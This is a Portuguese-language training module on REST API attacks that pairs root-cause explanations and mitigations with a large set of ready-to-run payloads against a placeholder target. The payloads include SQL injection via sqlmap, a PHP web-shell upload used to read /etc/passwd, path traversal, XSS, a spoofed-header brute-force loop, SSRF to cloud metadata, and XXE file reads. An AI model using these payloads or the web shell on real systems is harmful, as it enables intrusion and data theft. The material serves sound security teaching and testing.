---
title: "REST API Attacks"
---

# Ataques em APIs REST

## A Falha: APIs REST Expostas Sem Controles Equivalentes às Interfaces Web

APIs REST são o backbone da web moderna. Todo app mobile, SPA e serviço cloud expõe endpoints REST. Mas a forma como os controles de segurança são implementados cria uma divisão perigosa entre o que o usuário vê e o que a API aceita.

A suposição de design errada: o desenvolvedor implementa controles na interface gráfica — esconde campos, desabilita botões, limita seleções — e acredita que isso protege a lógica de negócio. Mas a API subjacente aceita qualquer input que chegar, independente do que a UI exibe.

**Perspectiva do desenvolvedor vs. da realidade:**

O desenvolvedor pensa: "o usuário não consegue ver o campo `role` no formulário, então não pode manipulá-lo". A API pensa: "recebi uma requisição POST com `role=admin` no body. Vou processar". Frameworks modernos como Rails, Laravel e Spring fazem bind automático de todos os parâmetros do body para o objeto, incluindo campos que nunca aparecem na UI — mass assignment.

**APIs esquecidas como superfície de ataque adicional:** Versões antigas de API (`/api/v1`, `/api/v2`) frequentemente continuam funcionais mesmo depois de "aposentadas". O endpoint `/v2/checkOTP` pode não implementar rate limiting, enquanto o `/v3/checkOTP` implementa — mas o cliente legado ainda chama a v2. A versão sem manutenção de segurança permanece acessível indefinidamente.

**Consequência antes de ver a exploração:** endpoints não documentados aceitam parâmetros que a UI esconde, versões antigas de API continuam ativas sem os controles da versão atual, e a superfície de ataque real é muito maior do que o que aparece na documentação oficial.

Em Bug Bounty, APIs REST são responsáveis por uma fração enorme de vulnerabilidades críticas — SQLi, IDOR, RCE via upload, e bypass de autenticação.

---

## Causa Raiz

### Mass Assignment — Framework Bind Automático de Parâmetros

O problema central do mass assignment é que frameworks modernos fazem bind de todos os parâmetros recebidos para o objeto do modelo, sem distinção entre campos que devem ser editáveis pelo usuário e campos internos.

```python
# VULNERAVEL — bind automatico de todos os campos do request
@app.route('/api/users/<int:user_id>', methods=['PUT'])
def update_user(user_id):
    user = User.query.get(user_id)
    # request.json pode conter: {"name": "João", "role": "admin", "balance": 99999}
    for key, value in request.json.items():
        setattr(user, key, value)  # aceita qualquer campo
    db.session.commit()

# SEGURO — allowlist explicita de campos editaveis
EDITABLE_FIELDS = {'name', 'email', 'phone'}

@app.route('/api/users/<int:user_id>', methods=['PUT'])
def update_user(user_id):
    user = User.query.get(user_id)
    for key, value in request.json.items():
        if key in EDITABLE_FIELDS:
            setattr(user, key, value)
    db.session.commit()
```

### Gerenciamento Impróprio de Inventário — Versões Esquecidas

A versão `/v2/checkOTP` frequentemente não tem rate limiting enquanto a `/v3/checkOTP` tem. A v2 pode estar documentada no Swagger e ainda funcional. Um endpoint "aposentado" sem data de remoção é um endpoint vulnerável indefinidamente:

```bash
# v3 — implementa rate limit, bloqueia apos N tentativas
POST /identity/api/v3/user/checkOTP  -> limitado

# v2 — sem rate limit, permite brute force irrestrito
POST /identity/api/v2/user/checkOTP  -> aberto

# login with token — removido na v4, mas v2.7 ainda responde
POST /identity/api/v2.7/user/login-with-token  -> expoe token no response
POST /identity/api/v4.0/user/login-with-token  -> retorna apenas mensagem
```

---

## Estrutura e Componentes de uma API REST

### Estrutura de uma API REST

| Componente | Descrição | Exemplo |
|---|---|---|
| Base URL | Endereço raiz da API | `http://api.target.com/v1` |
| Endpoint | Recurso específico | `/users`, `/products/:id` |
| Método HTTP | Operação | GET, POST, PUT, DELETE, PATCH |
| Headers | Metadados da requisição | `Authorization`, `Content-Type` |
| Parâmetros | Dados enviados | Query string, body JSON, path params |
| Status Code | Resultado | 200 OK, 401 Unauthorized, 500 Error |

### Fluxo de Autenticação Típico

```
1. POST /api/auth/login  { email, password }
   <- 200 OK  { token: "eyJ..." }

2. GET /api/users/me
   -> Authorization: Bearer eyJ...
   <- 200 OK  { id, email, role }

3. PUT /api/users/42  { name: "novo" }
   -> Authorization: Bearer eyJ...
   <- 200 OK
```

### Tipos de Parâmetros Vulneráveis

| Tipo | Localização | Exemplo Vulnerável |
|---|---|---|
| Path param | URL | `/api/users/42` → trocar `42` por `43` (IDOR) |
| Query string | URL | `?file=report.pdf` → LFI |
| Body JSON | Payload | `{"price": 0}` → lógica de negócio |
| Headers | HTTP | `X-Forwarded-For` → bypass rate limiting |
| Cookies | HTTP | `session=abc` → sequestro de sessão |

---

## Na Prática

### 1. Fuzzing de Endpoints com ffuf

Descoberta de endpoints não documentados:

```bash
# Fuzzing básico de endpoints
ffuf -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
     -u http://TARGET:PORT/api/FUZZ \
     -mc 200,201,204,301,302,401,403

# Fuzzing com extensão JSON
ffuf -w wordlist.txt \
     -u http://TARGET:PORT/api/FUZZ \
     -H "Content-Type: application/json" \
     -mc 200,201,400,401,403,405

# Fuzzing de parâmetros POST
ffuf -w params.txt \
     -u http://TARGET:PORT/api/users \
     -X POST \
     -d '{"FUZZ":"test"}' \
     -H "Content-Type: application/json" \
     -mc 200
```

### 2. Fuzzing com Kiterunner (melhor que ffuf para APIs)

```bash
# Scan com wordlists de rotas de API
kr scan http://TARGET:PORT -w routes-small.kite

# Usando arquivo de texto como wordlist
kr brute http://TARGET:PORT -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt

# Replay de requisição específica encontrada
kr kb replay -w routes-small.kite "GET 403 [ 183, 7, 8, 30 ] http://TARGET:PORT/api/admin"
```

### 3. SQLi em Parâmetros de API

```bash
# Teste manual
curl -s "http://TARGET:PORT/api/user/1"
curl -s "http://TARGET:PORT/api/user/1'"       # erro SQL?
curl -s "http://TARGET:PORT/api/user/1 AND 1=1"  # mesmo resultado?
curl -s "http://TARGET:PORT/api/user/1 AND 1=2"  # resultado diferente?

# Com sqlmap via API
sqlmap -u "http://TARGET:PORT/api/user/1" --batch --dbs

# SQLi em body JSON
sqlmap -u "http://TARGET:PORT/api/login" \
       --data='{"username":"*","password":"test"}' \
       --headers="Content-Type: application/json" \
       --batch --dbs
```

### 4. Upload de Backdoor via API

```bash
# Descobrir endpoint de upload
curl -X POST http://TARGET:PORT/api/profile/upload \
     -F "file=@shell.php" \
     -H "Authorization: Bearer TOKEN"

# Backdoor PHP simples
# Arquivo: shell.php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>

# Após upload bem-sucedido, executar
curl "http://TARGET:PORT/uploads/shell.php?cmd=id"
curl "http://TARGET:PORT/uploads/shell.php?cmd=cat+/etc/passwd"
```

### 5. LFI em Endpoint de Download

```bash
# Endpoint normal
curl "http://TARGET:PORT/api/download/report.pdf"

# Path traversal URL-encoded
curl "http://TARGET:PORT/api/download/..%2f..%2f..%2fetc%2fhosts"
curl "http://TARGET:PORT/api/download/..%2f..%2f..%2fetc%2fpasswd"

# Com double encoding
curl "http://TARGET:PORT/api/download/..%252f..%252f..%252fetc%252fpasswd"
```

### 6. XSS em Resposta de API

```bash
# Injetar payload XSS em campo de texto via API
curl -X POST http://TARGET:PORT/api/messages \
     -H "Content-Type: application/json" \
     -d '{"message": "<script>alert(document.domain)</script>"}'

# URL-encoded (caso o endpoint aceite query params)
curl "http://TARGET:PORT/api/search?q=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"

# Payload com event handler (quando script tags são bloqueados)
curl -X POST http://TARGET:PORT/api/profile \
     -d '{"bio": "<img src=x onerror=alert(1)>"}'
```

### 7. Bypass de Rate Limiting

```bash
# Técnica: manipular X-Forwarded-For para parecer IP diferente a cada request
for i in {1..100}; do
    curl -X POST http://TARGET:PORT/api/auth/login \
         -H "X-Forwarded-For: 192.168.1.$i" \
         -H "Content-Type: application/json" \
         -d '{"email":"admin@target.com","password":"'$i'"}'
done

# Headers alternativos para bypass
# X-Real-IP
# X-Originating-IP
# X-Remote-IP
# X-Remote-Addr
# X-Client-IP
curl -X POST http://TARGET:PORT/api/auth/login \
     -H "X-Real-IP: 127.0.0.1" \
     -d '{"email":"admin@target.com","password":"password123"}'
```

### 8. SSRF via API com Bypass Base64

```bash
# Endpoint vulnerável a SSRF
# Normal: http://TARGET:PORT/api/fetch?url=http://exemplo.com
# SSRF: acessar serviços internos

# Bypass com URL Base64
echo -n "http://127.0.0.1:8080/admin" | base64
# aHR0cDovLzEyNy4wLjAuMTo4MDgwL2FkbWlu

curl "http://TARGET:PORT/api/fetch?url=aHR0cDovLzEyNy4wLjAuMTo4MDgwL2FkbWlu"

# Alvos internos comuns para SSRF
# http://169.254.169.254/latest/meta-data/  (AWS metadata)
# http://127.0.0.1:9200/  (Elasticsearch)
# http://127.0.0.1:6379/  (Redis)
# http://127.0.0.1:8500/  (Consul)
```

### 9. ReDoS (Regular Expression Denial of Service)

```bash
# Payload clássico ReDoS - string muito longa com padrão que causa backtracking
# Para campos de email, username, etc.
curl -X POST http://TARGET:PORT/api/register \
     -H "Content-Type: application/json" \
     -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@aaaa"}'

# Para campos com validação de telefone
curl -X POST http://TARGET:PORT/api/profile \
     -d '{"phone":"(((((((((((((((((((((((((((((((("}'

# Verificar tempo de resposta - ReDoS aumenta drasticamente
time curl -X POST http://TARGET:PORT/api/register \
     -d '{"email":"aaaaaa...longstring...@a"}'
```

### 10. XXE em APIs que Aceitam XML

```bash
# Verificar se API aceita Content-Type: application/xml
curl -X POST http://TARGET:PORT/api/data \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?>
<data>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <item>&xxe;</item>
</data>'

# SSRF via XXE
curl -X POST http://TARGET:PORT/api/data \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://interno:8080/admin">
]>
<data><item>&xxe;</item></data>'
```

---

## Ferramentas

| Ferramenta | Uso Principal | Comando Base |
|---|---|---|
| **ffuf** | Fuzzing de endpoints/parâmetros | `ffuf -w wordlist -u URL/FUZZ` |
| **Kiterunner (kr)** | Fuzzing especializado em APIs | `kr scan URL -w routes.kite` |
| **sqlmap** | Injeção SQL automatizada | `sqlmap -u URL --batch --dbs` |
| **Burp Suite** | Interceptação e modificação | Proxy na porta 8080 |
| **curl** | Testes manuais de API | `curl -X POST -d '{}' URL` |
| **httpie** | Alternativa ao curl mais legível | `http POST URL key=value` |
| **Postman/Insomnia** | GUI para testes de API | Interface gráfica |
| **RapidAPI** | Plugin VSCode para testes de API | Extensão VSCode |
| **jwt_tool** | Análise e ataque de JWT | `python3 jwt_tool.py TOKEN` |

### Wordlists Importantes para APIs

```bash
# SecLists - APIs
/opt/SecLists/Discovery/Web-Content/api/
├── api-endpoints.txt          # Endpoints genéricos
├── api-endpoints-res.txt      # Com extensões
├── objects.txt                # Nomes de recursos REST

# Kiterunner
/opt/kiterunner/routes-small.kite    # ~20k rotas
/opt/kiterunner/routes-large.kite    # ~170k rotas
```

---

## Detecção e Mitigação

### Como Detectar se a API está Sendo Atacada

| Sinal | Indicador de Ataque |
|---|---|
| Alta taxa de requests 4xx | Fuzzing de endpoints |
| Requests com payloads SQL | SQLi automatizado |
| Headers X-Forwarded-For variados | Bypass de rate limiting |
| Requests com `../` no path | LFI/path traversal |
| Payloads XML em APIs JSON | Tentativa de XXE |
| Requests muito longos em campos de texto | ReDoS |
| IPs variando rapidamente | Brute force com rotação |

### Mitigações

```yaml
Rate Limiting:
  - Limitar por IP real (não por header)
  - Implementar CAPTCHA após N tentativas
  - Bloquear temporariamente IPs suspeitos

Validação de Entrada:
  - Validar tipo E formato de todos os parâmetros
  - Usar schemas (Yup, Joi, Zod) no frontend E backend
  - Rejeitar Content-Types inesperados (XML quando espera JSON)
  - Sanitizar antes de inserir no banco

Upload de Arquivo:
  - Validar extensão E magic bytes
  - Nunca servir uploads do mesmo domínio
  - Armazenar fora do webroot
  - Renomear arquivo no servidor

Autenticação:
  - JWT assinado com chave forte
  - Expiração curta de tokens
  - Refresh tokens rotativos
  - Blacklist de tokens revogados
```

---

## Módulos Relacionados

O módulo `02_graphql_attacks.md` aprofunda controles de acesso por campo em GraphQL, complementando os vetores de IDOR e mass assignment cobertos aqui. O módulo `03_web_service_attacks.md` aborda SOAP, WebSocket e outros protocolos com superfícies de ataque distintas das APIs REST. Para endpoints que aceitam dados serializados, consulte `../09_deserialization/01_deserialization_intro.md`.

---

## Metodologia de Teste de API (Checklist)

```
RECONHECIMENTO:
[ ] Identificar versões da API (v1, v2, etc.)
[ ] Mapear todos os endpoints com Kiterunner/ffuf
[ ] Identificar autenticação (Bearer, Basic, Cookie, API Key)
[ ] Analisar respostas de erro (verbosidade, stack traces)

AUTENTICAÇÃO:
[ ] Testar endpoints sem token
[ ] Testar com token expirado
[ ] Testar com token de outro usuário (IDOR horizontal)
[ ] Testar com token de usuário não-admin em endpoints admin

PARÂMETROS:
[ ] Injetar SQLi em todos os parâmetros
[ ] Tentar path traversal em parâmetros de arquivo
[ ] Testar valores negativos em campos numéricos
[ ] Testar tipos inesperados (array no lugar de string)
[ ] Testar campos omitidos (null safety)

FUNCIONALIDADES:
[ ] Upload de arquivo → testar extensões maliciosas
[ ] Busca/filtro → testar SQLi e NoSQLi
[ ] Download → testar LFI/SSRF
[ ] Webhook/URL → testar SSRF
[ ] Campos de texto → testar XSS e SSTI
```
